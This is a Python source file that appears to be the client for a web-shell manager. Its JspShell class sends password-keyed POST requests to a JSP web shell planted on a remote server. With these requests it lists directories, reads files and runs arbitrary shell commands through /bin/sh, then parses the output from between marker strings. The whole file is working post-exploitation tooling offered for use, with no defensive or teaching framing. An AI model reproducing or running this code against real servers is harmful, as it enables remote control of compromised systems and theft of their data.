# coding=utf-8

"""
@version: 1.0
@author: chaowei
@file: shell.py
@time: 2018/2/18 16:52
"""
import requests
import config

import sys

sys.path.append("..")

from entity import *
from dbHelper import DatabaseHelper

class ShellTools:

    def __init__(self):
        pass

    @staticmethod
    def getShellTools(shellEntity):
        if shellEntity.shell_script_type=='JSP':
            return JspShell(shellEntity)

class JspShell:

    def __init__(self,shellEntity):
        self.shellEntity=shellEntity
        self.httpSettingEntity=DatabaseHelper.getHttpSettingEntityByShellID(shellEntity.shell_id)
        if not self.httpSettingEntity:
            self.httpSettingEntity=HttpSettingEntity(config.HTTP_DEFAULT_COOKIE,config.HTTP_DEFAULT_UA)
        self.httpHeaders={'User-Agent': self.httpSettingEntity.user_agent,'Cookie':self.httpSettingEntity.cookie}

    def parseResponse(self,response):
        responseText=response.text
        if config.SPLIT_SYMBOL_LEFT in responseText and config.SPLIT_SYMBOL_RIGHT in responseText:
            resultText=responseText[responseText.find(config.SPLIT_SYMBOL_LEFT)+len(config.SPLIT_SYMBOL_LEFT):responseText.find(config.SPLIT_SYMBOL_RIGHT)]
            if config.ERROR_LABEL in resultText:
                return False,resultText
            return True,resultText
        else:
            return False,response.status_code

    def getStart(self):
        payload = {self.shellEntity.shell_password: 'A','z0':self.shellEntity.shell_encode_type}
        response=requests.post(self.shellEntity.shell_address,headers=self.httpHeaders,data=payload)
        return self.parseResponse(response)

    def getDirectoryContent(self,path):
        payload = {self.shellEntity.shell_password: 'B','z1':path,'z0':self.shellEntity.shell_encode_type}
        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
        return self.parseResponse(response)

    def getFileContent(self,path):
        payload = {self.shellEntity.shell_password: 'C', 'z1': path,'z0':self.shellEntity.shell_encode_type}
        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
        return self.parseResponse(response)

    def excuteCommand(self,path,command):
        z2='{0};{1};echo [S];pwd;echo [E]'.format(path,command)
        payload = {self.shellEntity.shell_password: 'M', 'z1': '-c/bin/sh','z2':z2, 'z0': self.shellEntity.shell_encode_type}
        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
        return self.parseResponse(response)